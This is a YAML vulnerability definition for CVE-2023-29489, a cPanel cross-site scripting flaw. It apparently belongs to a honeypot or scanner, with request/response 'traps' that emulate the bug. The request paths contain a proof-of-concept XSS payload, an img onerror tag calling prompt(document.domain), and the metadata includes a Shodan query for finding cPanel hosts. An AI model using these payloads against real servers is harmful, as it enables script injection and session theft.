id: CVE-2023-29489
info:
  name: cPanel < 11.109.9999.116 - Cross-Site Scripting
  author: DhiyaneshDk,0xKayala
  description: 'An issue was discovered in cPanel before 11.109.9999.116. Cross Site
    Scripting can occur on the cpsrvd error page via an invalid webcall ID.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patches or updates provided by cPanel to
    fix this vulnerability.

    '
  reference:
  - https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-29489
  - https://forums.cpanel.net/threads/cpanel-tsr-2023-0001-full-disclosure.708949/
  - https://github.com/SynixCyberCrimeMy/CVE-2023-29489
  - https://github.com/learnerboy88/CVE-2023-29489
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-29489
    cwe-id: CWE-79
    epss-score: 0.00302
    epss-percentile: 0.69029
    cpe: cpe:2.3:a:cpanel:cpanel:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: cpanel
    product: cpanel
    shodan-query: title:"cPanel"
  tags: cve,cve2023,cpanel,xss
traps:
- request:
    method: GET
    path: /cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaa
    headers: null
    body: null
  response:
    status_code: 400
    headers: {}
    body: '<img src=x onerror="prompt(document.domain)">aaaaaaaaaaaaInvalid webcall
      ID:'
- request:
    method: GET
    path: /cpanelwebcall/<><img%20src=x%20onerror="prompt(document.domain)">
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
